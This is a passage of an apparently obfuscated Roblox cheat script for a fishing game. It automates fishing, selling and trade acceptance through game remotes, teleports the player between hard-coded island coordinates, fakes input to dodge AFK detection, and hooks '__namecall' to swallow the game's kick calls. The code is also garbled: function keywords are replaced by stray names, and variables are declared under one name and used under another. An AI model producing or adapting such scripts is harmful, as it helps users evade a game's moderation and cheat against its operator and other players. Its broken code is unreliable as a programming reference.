                task.wait(AldyToib.loopDelay)
            end
        end)
    else
        AldyToiI.RF_CancelFishing:InvokeServer()
        pcall(function()
            if AldyToixU and AldyToixU.RequestClientStopFishing then
                AldyToixU:RequestClientStopFishing(true)
            end
        end)
    end
end

local var_i6owuw = {enabled = false, position = nil}
local var_9xctlq = true
local var_mlguqd = {}
local var_z5e3ek = "last_position.json"

local var_86etko AldyToigG()
    local var_ksanso = AldyToiG.Character
    if AldyToiQ and AldyToiQ:FindFirstChild("HumanoidRootPart") then
        local var_y12kpr = AldyToiQ.HumanoidRootPart.CFrame
        AldyToisG = {AldyToiT.X, AldyToiT.Y, AldyToiT.Z, ({AldyToiT:ToOrientation()})[1], ({AldyToiT:ToOrientation()})[2], ({AldyToiT:ToOrientation()})[3]}
        writefile(AldyToiHG, AldyToiO:JSONEncode(AldyToisG))
    end
end

local var_dwpro3 AldyToipG()
    if isfile(AldyToiHG) then
        local var_vp4q1z = AldyToiO:JSONDecode(readfile(AldyToiHG))
        AldyToisG = AldyToiQ
    end
    local var_0nwlxq = AldyToisG
    if AldyToiQ and (typeof(AldyToiQ) == "table" and #AldyToiQ >= 3) then
        local var_tz24zg = AldyToiG.Character or AldyToiG.CharacterAdded:Wait()
        local var_bgrpps = AldyToiT:WaitForChild("HumanoidRootPart", 5)
        if AldyToic then
            task.wait(0.3)
            AldyToic.CFrame = CFrame.new(AldyToiQ[1], AldyToiQ[2], AldyToiQ[3]) * CFrame.fromOrientation(AldyToiQ[4] or 0, AldyToiQ[5] or 0, AldyToiQ[6] or 0)
        end
    end
end

local var_3qxpja = nil

local var_jpekki AldyToiVG(AldyToiQ)
    if AldyToiQ then
        local var_y1r5km = AldyToiY:WaitForChild("Characters", 5)
        local var_u5opqw = AldyToiQ:FindFirstChild(AldyToiG.Name)
        if not AldyToiT then return end
        local var_bxlxd1 = AldyToiT:FindFirstChild("HumanoidRootPart")
        if not AldyToic then return end
        AldyToidG = Instance.new("Part")
        AldyToidG.Anchored = true
        AldyToidG.Size = Vector3.new(10, 1, 10)
        AldyToidG.Transparency = 1
        AldyToidG.CanCollide = true
        AldyToidG.Name = "floatplatform"
        AldyToidG.Parent = AldyToiY
        task.spawn(function()
            while AldyToidG and AldyToidG.Parent do
                pcall(function()
                    AldyToidG.Position = AldyToic.Position - Vector3.new(0, 3.5, 0)
                end)
                task.wait(0.1)
            end
        end)
    else
        if AldyToidG then
            AldyToidG:Destroy()
            AldyToidG = nil
        end
    end
end

local var_b7gy2x AldyToixG()
    local var_6flit0 = AldyToiG.Character
    if AldyToiQ and AldyToiQ:FindFirstChild("Humanoid") then
        AldyToiQ.Humanoid.Health = 0
    end
    AldyToiVG(AldyToib.floatingPlatform)
    local var_gmn8b9 = AldyToiY.Characters:FindFirstChild(AldyToiG.Name)
    local var_q1kbon = game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")
end

local var_ej4zev AldyToizG()
    local var_c2843c = game:GetService("VirtualUser")
    AldyToiT.LocalPlayer.Idled:Connect(function()
        AldyToiQ:Button2Down(Vector2.new(0, 0), AldyToiY.CurrentCamera.CFrame)
        task.wait(1)
        AldyToiQ:Button2Up(Vector2.new(0, 0), AldyToiY.CurrentCamera.CFrame)
        AldyToiQ:CaptureController()
        AldyToiQ:ClickButton2(Vector2.new())
    end)
end

AldyToizG()

local var_6tv23j AldyToifG()
    AldyToiI.RF_SellAllItems:InvokeServer()
    AldyToidU = 0
end

local var_i5r8r3, AldyToiwG, AldyToilG, AldyToiuG, AldyToiqG, AldyToitG, AldyToiRG, AldyToinG
local var_uu398m = 10

do
    AldyToij:Paragraph({
        Title = "Auto Fishing Settings",
        Desc = "Change your settings here.",
        Color = "Green",
        Locked = true
    })
    AldyToinG = AldyToij:Dropdown({
        Title = "Select Cast",
        Values = {"Random", "perfect", "Amazing"},
        Default = false,
        Default = "Random",
        AllowNone = false,
        Callback = function(AldyToiQ)
            AldyToib.castStyle = AldyToiQ
        end
    })
    AldyToiJG = AldyToij:Toggle({
        Title = "Auto Fishing",
        Default = false,
        Callback = function(AldyToiQ)
            AldyToib.autoFishing = AldyToiQ
            AldyToieU(AldyToiQ)
            -- HAPUS LOGIC MODE SLOW/NORMAL/STUCK
            if not AldyToiQ then
                -- ALDYTOIEU SUDAH DIOPTIMALKAN UNTUK STOP DAN KECEPATAN
                AldyToieU(AldyToiQ)
            end
        end
    })
    -- PENTING: SLIDER INI HARUS DIATUR KE NILAI TERENDAH DI GUI UNTUK KECEPATAN MAKSIMAL
    AldyToiuG = AldyToij:Slider({
        Title = "Loop Delay",
        Value = {
            Min = 0.09,
            Max = 2,
            Default = 0.01 
        },
        Step = 0.1,
        Callback = function(AldyToiQ)
            AldyToib.loopDelay = AldyToiQ
        end
    })
    AldyToiRG = AldyToij:Dropdown({
        Title = "Fishing Animation",
        Values = {"skip", "normal"},
        Default = "skip", -- DIATUR KE SKIP SECARA DEFAULT UNTUK KECEPATAN
        Multi = false,
        AllowNone = false,
        Callback = function(AldyToiQ)
            AldyToib.animate = AldyToiQ
        end
    })
    AldyToitG = AldyToij:Toggle({
        Title = "Auto Recast/Anti Stuck",
        Desc = "Automatically recasts if you get stuck.",
        Default = true,
        Callback = function(AldyToiQ)
            AldyToib.autoRecast = AldyToiQ
        end
    })
    AldyToiqG = AldyToij:Slider({
        Title = "Auto Recast Delay",
        Default = {
            Min = 6,
            Max = 20,
            Default = 10
        },
        Step = 1,
        Value = 10,
        Callback = function(AldyToiQ)
            AldyToirG = tonumber(AldyToiQ)
        end
    })

    local var_3hgoz0 = {"Common", "Uncommon", "Rare", "Epic", "Legendary", "Mythical", "SECRET"}
    AldyToiwG = AldyToij:Dropdown({
        Name = "Tier Filter",
        Values = AldyToid,
        Default = {"Common", "Uncommon", "Rare", "Epic", "Legendary", "Mythical", "SECRET"},
        Multi = true,
        AllowNone = true,
        Callback = function(AldyToiQ)
            AldyToib.selectedTier = AldyToiQ
        end
    })
    AldyToilG = AldyToij:Toggle({
        Title = "Enable Filter",
        Desc = "Only catch fish of the selected tiers.",
        Default = false,
        Callback = function(AldyToiQ)
            AldyToib.enableFilter = AldyToiQ
        end
    })
    AldyToij:Button({
        Title = "Respawn",
        Desc = "Immediately respawn your character.",
        Callback = function()
            AldyToixG()
        end
    })
end

local var_fvj1bs = nil
AldyToiFG = hookmetamethod(game, "__namecall", function(AldyToiQ, ...)
    local var_lidnh9 = getnamecallmethod()
    if tostring(string.lower(AldyToiT)) == "kick" then
        return nil
    end
    return AldyToiFG(AldyToiQ, ...)
end)
AldyToiM:Section({Title = "Auto Sell Features"})
AldyToiM:Button({
    Title = "Sell All Items",
    Desc = "Instantly sell all fish in your inventory.",
    Callback = function()
        pcall(function()
            (((((AldyToiH:WaitForChild("Replion")):WaitForChild("_Index")):WaitForChild("sleightnick_net@0.2.0")):WaitForChild("net")):WaitForChild("RF_SellAllItems")):InvokeServer()
            AldyToiQ:Notify({
                Title = "Success",
                Description = "Successfully sold all items.",
                Duration = 3
            })
        end)
    end
})
local var_ha2v7e = AldyToiM:Toggle({
    Title = "Auto Sell",
    Desc = "Automatically sell fish based on the catch threshold.",
    Default = false,
    Callback = function(AldyToiQ)
        AldyToib.AutoSell = AldyToiQ
    end
})
local var_e17wtp = 10
local var_hml54i = AldyToiM:Input({
    Title = "Auto Sell Threshold",
    Desc = "Number of fish to catch before selling.",
    Placeholder = "Default: 30",
    Type = "Input",
    Default = 30,
    Callback = function(AldyToiT)
        local var_eh7loq = tonumber(AldyToiT)
        if AldyToic then
            AldyToiDG = AldyToic
            AldyToiQ:Notify({
                Title = "Threshold Updated",
                Description = "Fish will be sold automatically when the catch reaches " .. AldyToiDG,
                Duration = 1
            })
        else
            AldyToiQ:Notify({
                Title = "Invalid Input",
                Description = "Invalid number. Please enter a valid number.",
                Duration = 1
            })
        end
    end
})
local var_9txywn = 4990
local var_pqmmzi = {
    ["Mysterious Cave"] = {CFrame.new(-65.1821136, 3.53157115, 2775.68311, 0.33803311, 3.37374004e-08, 0.941134214, 3.34767392e-09, 1, -3.7050004e-08, -0.941134214, 1.5674738e-08, 0.33803311)},
    ["Ancient Underground Stelar"] = {CFrame.new(2100.39917, -91.1976471, -710.773804, 0.122371674, -6.42108589e-09, -0.992484331, 1.06256577e-08, 1, -5.15958387e-09, 0.992484331, -9.9144124e-09, 0.122371674)},
    ["Ancient Temple"] = {CFrame.new(1462.6908, -22.1250019, -672.93335, -0.147424042, -4.63247218e-08, 0.989073396, -9.93669929e-08, 1, 3.2025568e-08, -0.989073396, -9.35599047e-08, -0.147424042), CFrame.new(1462.6908, -22.1250019, -672.93335, -0.147424042, -4.63247218e-08, 0.989073396, -9.93669929e-08, 1, 3.2025568e-08, -0.989073396, -9.35599047e-08, -0.147424042), CFrame.new(1492.74304, -10.3161592, -586.368286, 0.322791666, -1.40727296e-08, -0.946470022, -6.17820533e-08, 1, -3.59392907e-08, 0.946470022, 7.00757639e-08, 0.322791666), CFrame.new(1499.65027, -22.1250019, -641.448853, 0.993384957, -1.17929684e-08, 0.114831701, 1.2063949e-08, 1, -1.66484504e-09, -0.114831701, 3.03915582e-09, 0.993384957)},
    ["Ancient Jungle Artifact"] = {CFrame.new(1500.73401, 6.62499952, -852.561646, -0.989423037, -1.68072827e-08, -0.1450589, -1.83718125e-08, 1, 9.44590894e-09, 0.1450589, 1.20109949e-08, -0.989423037), CFrame.new(1832.86194, 5.16533995, -325.743347, -0.183020815, -4.05987208e-08, -0.983109057, -3.93755393e-08, 1, -3.39658932e-08, 0.983109057, 3.24939826e-08, -0.183020815), CFrame.new(1381.57349, 4.61032534, 113.14798, -0.999778867, -4.56558924e-09, 0.021029843, -4.14713286e-09, 1, 1.99418313e-08, -0.021029843, 1.98502068e-08, -0.999778867), CFrame.new(881.009094, 5.9040761, -342.943146, 0.21528995, 3.16417044e-08, 0.976550162, -4.32311857e-08, 1, -2.28707808e-08, -0.976550162, -3.72935709e-08, 0.21528995)},
    ["Coral Reefs"] = {CFrame.new(-3118.39624, 2.42531538, 2135.26392, 0.92336154, -1.0069185e-07, -0.383931547, 8.0607947e-08, 1, -6.84016968e-08, 0.383931547, 3.22115596e-08, 0.92336154), CFrame.new(-2965.5708, 22.7500286, 2249.01709, 0.0730288103, 3.98725897e-09, 0.997329831, 2.27064021e-08, 1, -5.6605951e-09, -0.997329831, 2.30591581e-08, 0.0730288103), CFrame.new(-3102.16309, 5.97334528, 2218.88696, 0.758339584, 8.40698444e-09, -0.651859701, 2.32941257e-08, 1, 3.99960918e-08, 0.651859701, -4.55151223e-08, 0.758339584)},
    ["Weather Machine"] = {CFrame.new(-1459.3772, 14.7103214, 1831.5188, 0.777951121, 2.52131862e-08, -0.628324807, -5.24126378e-08, 1, -2.47663063e-08, 0.628324807, 5.21991339e-08, 0.777951121), CFrame.new(-1521.20862, 2.87499976, 1912.40564, -0.989418149, 1.00299182e-08, -0.14509216, 6.85348089e-09, 1, 2.23923866e-08, 0.14509216, 2.11610462e-08, -0.989418149), CFrame.new(-1574.57129, 13.1473379, 1920.83826, -0.816545427, -3.39974235e-08, 0.577281177, -6.96619793e-08, 1, -3.96422877e-08, -0.577281177, -7.25842781e-08, -0.816545427)},
    ["Sisyphus"] = {CFrame.new(-3765.69751, -135.074417, -906.893677, 0.704144239, 3.52946827e-08, -0.710056961, -3.45032909e-08, 1, 1.5490853e-08, 0.710056961, 1.35915084e-08, 0.704144239), CFrame.new(-3780.09692, -135.074417, -962.226746, -0.366469413, -5.94525993e-08, -0.930430114, 1.91083362e-08, 1, -7.14241963e-08, 0.930430114, -4.39537544e-08, -0.366469413)},
    ["Volcano"] = {CFrame.new(1820.92529, 5.7885952, 3305.04761, -0.290378898, 1.26296209e-08, -0.956911743, -2.8187932e-08, 1, 2.17520597e-08, 0.956911743, 3.32897017e-08, -0.290378898), CFrame.new(1704.83362, 4.38193512, 3189.80811, 0.715091407, 8.31226021e-09, 0.699030936, -3.8851347e-08, 1, 2.78528525e-08, -0.699030936, -4.70756305e-08, 0.715091407)},
    ["Exotic Depth"] = {CFrame.new(3272.27344, -1301.35535, 1390.97058, -0.422851175, -5.61508493e-08, -0.906199157, 7.32285486e-08, 1, -9.6132986e-08, 0.906199157, -1.07009591e-07, -0.422851175)},
    ["Deep Sea"] = {CFrame.new(-2126.49707, 53.4868774, 3640.20581, -0.872817099, 4.77880704e-08, 0.488047391, 7.77828291e-09, 1, -8.40062881e-08, -0.488047391, -6.95259601e-08, -0.872817099)},
    ["Treasure Room"] = {CFrame.new(-3600.62988, -279.0737, -1692.755, -0.938830554, -1.7142467e-08, 0.344379485, -1.96833128e-08, 1, -3.8818464e-09, -0.344379485, -1.04229247e-08, -0.938830554), CFrame.new(-3625.0708, -279.074219, -1594.57605, 0.918176472, -3.97606392e-09, -0.396171629, -1.12946204e-08, 1, -3.62128851e-08, 0.396171629, 3.77244298e-08, 0.918176472), CFrame.new(-3600.72632, -276.06427, -1640.79663, -0.696130812, -6.0491181e-09, 0.717914939, -1.09490363e-08, 1, -2.19084972e-09, -0.717914939, -9.38559541e-09, -0.696130812), CFrame.new(-3548.52222, -269.309845, -1659.26685, 0.0472991578, -4.08685423e-08, 0.998880744, -7.68598838e-08, 1, 4.45538149e-08, -0.998880744, -7.88812216e-08, 0.0472991578), CFrame.new(-3581.84155, -279.09021, -1696.15637, -0.999634147, -0.000535600528, -0.0270430837, -0.000448358158, 0.999994695, -0.00323198596, 0.0270446707, -0.00321867829, -0.99962908), CFrame.new(-3601.34302, -282.790955, -1629.37036, -0.526346684, 0.00143659476, 0.850268841, -0.000266355521, 0.999998271, -0.00185445137, -0.850269973, -0.00120255165, -0.526345372), CFrame.new(-3601.52588, -282.991669, -1629.59265, -0.0535041578, -7.48535811e-08, 0.998567641, 6.44989342e-08, 1, 7.84168677e-08, -0.998567641, 6.86021764e-08, -0.0535041578), CFrame.new(-3594.76074, -275.663788, -1642.65515, 0.992020428, 2.66124651e-08, -0.126077324, -2.72226544e-08, 1, -3.11684589e-09, 0.126077324, 6.52413412e-09, 0.992020428)},
    ["Lost Shore"] = {CFrame.new(-3686.70557, 50.5551491, -802.862549, 0.671186864, -1.9727894e-08, 0.741288185, 8.82212987e-08, 1, -5.32654987e-08, -0.741288185, 1.01148508e-07, 0.671186864), CFrame.new(-3674.72852, 5.4255538, -860.631531, -0.995413721, 6.02128791e-09, 0.0956638828, 3.38107586e-09, 1, -2.77609349e-08, -0.0956638828, -2.73101683e-08, -0.995413721)},
    ["Mohana Volcano"] = {CFrame.new(-648.832397, 45.2862358, 146.425705, -0.107698888, -2.22477787e-08, 0.99418354, 2.75738845e-08, 1, 2.53649883e-08, -0.99418354, 3.01452836e-08, -0.107698888), CFrame.new(-673.803223, 55.5000572, 183.610779, 0.122808129, 6.084327e-08, -0.992430449, -9.00719144e-08, 1, 5.01614039e-08, 0.992430449, 8.32298852e-08, 0.122808129), CFrame.new(-675.741272, 55.5000572, 164.999741, 0.700404584, -6.1561245e-08, -0.713746011, 7.66120891e-08, 1, -1.10708571e-08, 0.713746011, -4.69274966e-08, 0.700404584), CFrame.new(-648.186584, 45.7505226, 172.17453, -0.995664299, 3.11417523e-08, 0.0930196419, 3.00717424e-08, 1, -1.29047226e-08, -0.0930196419, -1.0051509e-08, -0.995664299)},
    ["Whirlpool"] = {CFrame.new(-658.677429, 20.0969162, 547.795715, 0.08832293, -2.84166846e-09, -0.996091902, 1.26686484e-08, 1, -1.72949544e-09, 0.996091902, -1.24663835e-08, 0.08832293), CFrame.new(-653.275757, 17.2500591, 490.213684, 0.223178998, 0, -0.97477746, 0, 1, 0, 0.97477746, 0, 0.223178998)},
    ["Sky Island"] = {CFrame.new(1066.1864, 57.2025681, 5045.5542, -0.682534158, 1.00865822e-08, 0.730853677, -5.8900711e-09, 1, -1.93017531e-08, -0.730853677, -1.74788859e-08, -0.682534158), CFrame.new(1057.28992, 33.0884132, 5133.79883, 0.833871782, 5.44149223e-08, 0.551958203, -6.58184218e-09, 1, -8.86416984e-08, -0.551958203, 7.02829084e-08, 0.833871782), CFrame.new(988.954712, 42.8254471, 5088.71289, -0.849417388, -9.89310394e-08, 0.527721584, -5.96115086e-08, 1, 9.15179328e-08, -0.527721584, 4.62786431e-08, -0.849417388), CFrame.new(1006.70685, 17.2302666, 5092.14844, -0.989664078, 5.6538525e-09, -0.143405005, 9.14879283e-09, 1, -2.3711717e-08, 0.143405005, -2.47786183e-08, -0.989664078), CFrame.new(1025.02356, 2.77259707, 5011.47021, -0.974474192, -6.87871804e-08, 0.224499553, -4.47472104e-08, 1, 1.12170284e-07, -0.224499553, 9.92613209e-08, -0.974474192), CFrame.new(1071.14551, 3.528404, 5038.00293, -0.532300115, 3.38677708e-08, 0.84655571, 6.69992914e-08, 1, 2.12149165e-09, -0.84655571, 5.7847906e-08, -0.532300115), CFrame.new(1022.55457, 16.6277809, 5066.28223, 0.721996129, 0, -0.691897094, 0, 1, 0, 0.691897094, 0, 0.721996129), CFrame.new(1023.29114, 19.1177425, 5070.02588, 0.507022858, 2.01505461e-08, -0.861932635, 5.94909153e-08, 1, 5.83732387e-08, 0.861932635, -8.08737255e-08, 0.507022858), CFrame.new(981.318909, 41.6503983, 5078.02344, -0.0676535219, -6.19234299e-08, 0.997708857, -2.32029294e-08, 1, 6.04922619e-08, -0.997708857, -1.90572536e-08, -0.0676535219)}
}
local var_c5x64h AldyToiUG()
    if not AldyToiIU or #AldyToiIU == 0 then
        AldyToiQ:Notify({
            Title = "No Island Selected",
            Description = "Please select an island to start auto farm.",
            Duration = 1
        })
        return
    end
    local var_sdfgka = AldyToiIU[math.random(1, #AldyToiIU)]
    local var_cibhaq = AldyToikG[AldyToiT]
    if AldyToic and #AldyToic > 0 then
        local var_nr1oo6 = AldyToic[math.random(1, #AldyToic)]
        local var_1p1qhn = game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")
        if AldyToiT.Anchored then
            AldyToiT.Anchored = false
            task.wait(0.1)
        end
        AldyToiT.CFrame = AldyToiQ
        if AldyToiGG.enabled then
            AldyToiGG.position = AldyToiT.CFrame
        end
    end
end
AldyToiK:Paragraph({
    Title = "Auto Farm Settings",
    Desc = "Auto farm selected fishing spots.",
    Color = "Green",
    Locked = true
})
local var_yilehs = {}
for AldyToiQ, AldyToiT in pairs(AldyToikG) do
    table.insert(AldyToiBG, AldyToiQ)
    table.sort(AldyToiBG)
end
local var_huz6ef = AldyToiK:Dropdown({
    Title = "Select Island",
    Values = AldyToiBG,
    Multi = true,
    AllowNone = true,
    Callback = function(AldyToiQ)
        AldyToiIU = AldyToiQ
    end
})
local var_psp8p4 = 10
local var_d5d1xo = AldyToiK:Input({
    Title = "Auto Teleport Threshold",
    Placeholder = "Default: 10",
    Value = 10,
    Type = "Input",
    Callback = function(AldyToiT)
        local var_lm9jnv = tonumber(AldyToiT)
        if AldyToic then
            AldyToivG = AldyToic
            AldyToiQ:Notify({
                Title = "Threshold Updated",
                Description = "Auto teleport will occur when the fish count reaches " .. (AldyToic .. " items."),
                Duration = 1
            })
        else
            AldyToiQ:Notify({
                Title = "Invalid Input",
                Description = "Invalid number. Please enter a valid number.",
                Duration = 1
            })
        end
    end
})

AldyToib.autoFarming = false
local var_4n5dq2 = AldyToiK:Toggle({
    Title = "Auto Farming",
    Default = false,
    Callback = function(AldyToiQ)
        AldyToib.autoFarming = AldyToiQ
        if AldyToiQ then
            AldyToiUG()
            AldyToiJG:Set(AldyToiQ)
            AldyToieU(AldyToiQ)
        end
    end
})
local var_laoh2l = true
local var_uoth4g = AldyToiC:Toggle({
    Title = "Favorite All Artifact",
    Desc = "Automatically favorite all Artifact items.",
    Default = true,
    Callback = function(AldyToiQ)
        AldyToiSG = AldyToiQ
    end
})
local var_hoxrwo = AldyToiC:Toggle({
    Title = "Favorite All Legendary",
    Desc = "Automatically favorite all Legendary items.",
    Default = false,
    Callback = function(AldyToiQ)
        AldyToiZ.Legendary = AldyToiQ
        if AldyToiQ then
            task.spawn(function()
                AldyToiNU()
            end)
        end
    end
})
local var_bg9vtt = AldyToiC:Toggle({
    Title = "Favorite All Mythical",
    Desc = "Automatically favorite all Mythical items.",
    Default = true,
    Callback = function(AldyToiQ)
        AldyToiZ.Mythical = AldyToiQ
        if AldyToiQ then
            task.spawn(function()
                AldyToikU()
            end)
        end
    end
})
local var_6jfdkr = AldyToiC:Toggle({
    Title = "Favorite All Secret",
    Desc = "Automatically favorite all Secret items.",
    Default = false,
    Callback = function(AldyToiQ)
        AldyToiZ.Secret = AldyToiQ
        if AldyToiQ then
            task.spawn(function()
                AldyToiUU()
            end)
        end
    end
})
local var_mf6g1g = AldyToiH:WaitForChild("Tags")
local var_sh6cba = {}
for AldyToiQ, AldyToiT in ipairs(AldyToijG:GetChildren()) do
    table.insert(AldyToiMG, AldyToiT.Name)
end
local var_zj3gpk = {}
local var_auw0an = AldyToiC:Dropdown({
    Title = "Select variant",
    Desc = "Automatically favorite variants.",
    Values = AldyToiMG,
    Multi = true,
    Default = false,
    Value = {},
    Callback = function(AldyToiQ)
        AldyToiKG = AldyToiQ
    end
})
AldyToiC:Button({
    Title = "Favorite All",
    Desc = " Favorite all items.",
    Callback = function()
        task.spawn(function()
            AldyToiZU()
        end)
    end
})
AldyToiC:Button({
    Title = "Unfavorite All",
    Desc = "Unfavorite all favorited items.",
    Callback = function()
        AldyToibU()
    end
})
local var_57zti5
local var_rkvslv

do
    AldyToiPG = AldyToiP:Toggle({
        Title = "Floating Platform",
        Desc = "Spawns a floating platform under your character.",
        Default = false,
        Callback = function(AldyToiQ)
            AldyToib.floatingPlatform = AldyToiQ
            AldyToiVG(AldyToiQ)
        end
    })

    local var_cif6ex = {
        FrameName = "TradePrompt",
        YesButtonName = "Yes",
        ClicksPerSecond = 1,
        MaxSpamSeconds = 4,
        EdgePaddingFrac = 0.05,
        UseVIM = true,
        AlsoMoveMouse = false,
        ClickDelay = 0.3,
        MaxSpamTime = 0.5,
        StopOnTextMatches = {"trade completed!", "trade successful"},
        StopOnFailMatches = {"trade declined", "trade failed"},
        RayfieldEnabled = true
    }

    local var_cfa2ri = game:GetService("VirtualUser")
    local var_edpaof = game:GetService("CoreGui")
    local var_4u8blq = game:GetService("ReplicatedStorage")
    local var_ems8il = AldyToiG:WaitForChild("PlayerGui")
    local var_a1b24t, AldyToiH = false, false
    local var_nwy47e = false
    local var_8iye3z = nil
    local var_g1dlsv = nil
    local var_eswgqe = nil
    local var_f830gb = nil
    local var_853a4j = nil
    local var_c63aj6 = nil
    local var_873jdg AldyToiJ(AldyToiQ)
        return AldyToiQ and (AldyToiQ.Parent and (AldyToiQ.Visible and (AldyToiQ.Active and (AldyToiQ.AbsoluteSize.Magnitude > 0 and AldyToiQ:IsDescendantOf(AldyToiO)))))
    end

    local var_a0vx4v AldyToiw()
        local var_vgco0o = AldyToiO:FindFirstChild(AldyToiQ.FrameName)
        return AldyToiT and (AldyToiT:IsA("ScreenGui") and AldyToiT) or nil
    end

    local var_qp8me5 AldyToil()
        local var_0hxx9o = AldyToiw()
        if not AldyToiQ then return nil end
        local var_yz2ogw = AldyToiQ:FindFirstChildWhichIsA("TextLabel", true)
        return AldyToiT and AldyToiT.Text or nil
    end

    local var_bsohuw AldyToiu()
        local var_k6u1k6 = AldyToil()
        if not AldyToiQ then return false end
        AldyToiQ = AldyToiQ:lower()
        return AldyToiQ:find("accept") and AldyToiQ:find("trade") or false
    end

    local var_y3guzy AldyToiq(AldyToiT)
        if not AldyToiT then return nil end
        for AldyToiT, AldyToic in ipairs(AldyToiT:GetDescendants()) do
            if AldyToiu() and (AldyToic:IsA("TextButton") and AldyToic.Name == AldyToiQ.YesButtonName) then
                if AldyToiJ(AldyToic) then return AldyToic end
            end
        end
        return nil
    end

    local var_vznzsc AldyToit(AldyToiQ)
        local var_q4ltg2, AldyToiY = AldyToiQ.AbsolutePosition, AldyToiQ.AbsoluteSize
        local var_0bn03e = AldyToic:GetGuiInset()
        return {
            X = AldyToiT.X,
            Y = AldyToiT.Y + AldyToiG.Y,
            W = AldyToiY.X,
            H = AldyToiY.Y
        }
    end

    local var_3bthsu AldyToiR(AldyToiT)
        local var_3wyd1k = math.clamp(AldyToiQ.EdgePaddingFrac, 0, 0.49)
        local var_oisffx, AldyToiG = AldyToiT.X + AldyToiT.W * AldyToic, AldyToiT.X + AldyToiT.W * (1 - AldyToic)
        local var_p453u2, AldyTois = AldyToiT.Y + AldyToiT.H * AldyToic, AldyToiT.Y + AldyToiT.H * (1 - AldyToic)
        local var_8dssuu = (AldyToiY + AldyToiG) / 2
        local var_3y2j3j = (AldyToiO + AldyTois) / 2
        return AldyToiH, AldyToig
    end

    (AldyToiG.PlayerGui:WaitForChild("Prompt")).ChildAdded:Connect(function(AldyToiQ)
        if AldyToiQ.Name == "NotificationPrompt" then
            local var_lucg9i = AldyToiQ:WaitForChild("Options")
            local var_892g1p = AldyToiT:WaitForChild("Yes")
            AldyToic.Active = true
            AldyToic.Visible = true
        end
    end)

    local var_bs6b69 AldyToin(AldyToic, AldyToiY)
        if AldyToiQ.UseVIM and AldyToiT then
            pcall(function()
                if AldyToiQ.AlsoMoveMouse then
                    AldyToiT:SendMouseMoveEvent(AldyToic, AldyToiY, game)
                    task.wait(AldyToiQ.ClickDelay)
                end
                AldyToiT:SendMouseButtonEvent(AldyToic, AldyToiY, 0, true, game, 0)
                task.wait(AldyToiQ.ClickDelay)
                AldyToiT:SendMouseButtonEvent(AldyToic, AldyToiY, 0, false, game, 0)
            end)
        elseif AldyToiV and AldyToiJ(AldyToiV) then
            pcall(function()
                AldyToiV.MouseButton1Click:Fire()
            end)
        end
    end

    local var_3y9rbe AldyToir()
        AldyToig = true
        for AldyToiQ = 1, 50, 1 do
            if not AldyToiH then break end
            task.wait(0.01)
        end
        AldyToiH = false
    end

    local var_htfp0p AldyToiF(AldyToiQ, AldyToiT)
        local var_70txkn = tick() + (AldyToiT or 2)
        while tick() < AldyToic do
            local var_67371j = AldyToiq(AldyToiQ)
            if AldyToiT and AldyToiJ(AldyToiT) then
                return AldyToiT
            end
            task.wait(0.05)
        end
        return nil
    end

    local var_7yfke5 AldyToiX()
        if AldyToiH then return end
        AldyToiV = AldyToiF(AldyToid, 2)
        if not AldyToiV then return end
        local var_zjnibo = AldyToit(AldyToiV)
        AldyToiH = true
        AldyToig = false
        AldyToip = task.spawn(function()
            local var_d93to3 = tick()
            local var_jhzuqa = 0
            while AldyToiH and (AldyTois and not AldyToig) do
                if not AldyToiJ(AldyToiV) then break end
                if AldyToiY % 5 == 0 then
                    local var_si2jt9 = AldyToit(AldyToiV)
                    if AldyToiQ then AldyToiT = AldyToiQ end
                end
                local var_uaj39s, AldyToiO = AldyToiR(AldyToiT)
                AldyToin(AldyToiG, AldyToiO)
                AldyToiY = AldyToiY + 1
                local var_vts5gs = 1 / math.clamp(AldyToiQ.ClicksPerSecond, 6, 40)
                task.wait(AldyTois)
                if tick() - AldyToic > AldyToiQ.MaxSpamSeconds then
                    break
                end
            end
            AldyToiH = false
        end)
    end

    local var_5yszms AldyToiD()
        if AldyToif then
            AldyToif:Disconnect()
            AldyToif = nil
        end
        AldyToiz = AldyToiz or AldyToiY:FindFirstChild("GlobalNotifications")
        if AldyToiz and AldyToiz:IsA("RemoteEvent") then
            AldyToif = AldyToiz.OnClientEvent:Connect(function(AldyToiT)
                local var_e8acrr = type(AldyToiT) == "table" and AldyToiT.Text or AldyToiT
                if not AldyToic then return end
                local var_ok4pyz = (tostring(AldyToic)):lower()
                for AldyToiQ, AldyToiT in ipairs(AldyToiQ.StopOnTextMatches) do
                    if string.find(AldyToiY, AldyToiT:lower(), 1, true) then
                        AldyToir()
                        return
                    end
                end
                for AldyToiQ, AldyToiT in ipairs(AldyToiQ.StopOnFailMatches) do
                    if string.find(AldyToiY, AldyToiT:lower(), 1, true) then
                        AldyToir()
                        return
                    end
                end
            end)
        end
    end

    local var_k9x38p AldyToiL()
        if not AldyTois or not AldyToid then return end
        if AldyToid.Enabled then
            task.delay(AldyToiQ.ClickDelay, AldyToiX)
        else
            AldyToir()
        end
    end

    local var_ntl9xr AldyToiN()
        if AldyToix then AldyToix:Disconnect() end
        AldyToid = AldyToiw()
        if not AldyToid then return end
        AldyToix = (AldyToid:GetPropertyChangedSignal("Enabled")):Connect(AldyToiL)
    end

    local var_xgnvu2 AldyToik(AldyToiT)
        AldyToiT = AldyToiT or {}
        for AldyToiT, AldyToic in pairs(AldyToiT) do
            if AldyToiQ[AldyToiT] ~= nil then
                AldyToiQ[AldyToiT] = AldyToic
            end
        end
        AldyToiD()
    end

    local var_7dl7ea AldyToiU()
        if AldyTois then return end
        AldyTois = true
        AldyToiN()
        task.delay(AldyToiQ.ClickDelay, function()
            if AldyTois and (AldyToid and AldyToid.Enabled) then
                AldyToiX()
            end
        end)
    end

    local var_ah7y13 AldyToiB()
        if not AldyTois then return end
        AldyTois = false
        AldyToir()
    end

    local var_xxgzbm AldyToiI(AldyToiT)
        AldyToiQ.YesButtonName = AldyToiT
    end

    local var_osmq3h AldyToiv(AldyToiT)
        AldyToiQ.RayfieldEnabled = AldyToiT
        AldyToiQ.UseVIM = AldyToiT
        if not AldyToiT then AldyToiB() end
    end

    AldyToiAG = AldyToiP:Toggle({
        Title = "AutoAcceptTrade",
        Default = false,
        Callback = function(AldyToiQ)
            if AldyToiQ then
                AldyToiv(true)
                AldyToiU()
            else
                AldyToiv(false)
            end
        end
    })
    AldyToik({RayfieldEnabled = false})
end

local var_tbjcqx AldyToimG(AldyToiQ)
    if not AldyToiQ or type(AldyToiQ) ~= "number" then return "???" end
    if AldyToiQ >= 1000000 then
        return string.format("%.2fM", AldyToiQ / 1000000)
